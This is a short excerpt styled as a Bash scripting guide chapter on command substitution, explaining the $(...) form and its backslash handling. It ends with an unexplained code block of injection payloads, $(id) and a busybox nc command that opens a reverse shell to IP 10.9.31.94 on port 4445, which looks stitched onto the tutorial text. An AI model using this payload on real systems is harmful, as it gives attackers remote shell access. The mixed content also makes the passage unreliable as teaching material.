# Advanced Bash-Scripting Guide

### Chapter 12. Command Substitution
Command substitution reassigns the output of a command [1] or even multiple commands; it literally plugs the command output into another context. 
The $(...) form has superseded backticks for command substitution.

The $(...) form of command substitution treats a double backslash in a different way than `...`.

```sh
bash$ echo `echo \\`


bash$ echo $(echo \\)
\
```

```sh
$(id)
$(busybox nc 10.9.31.94 4445 -e /bin/bash)
```
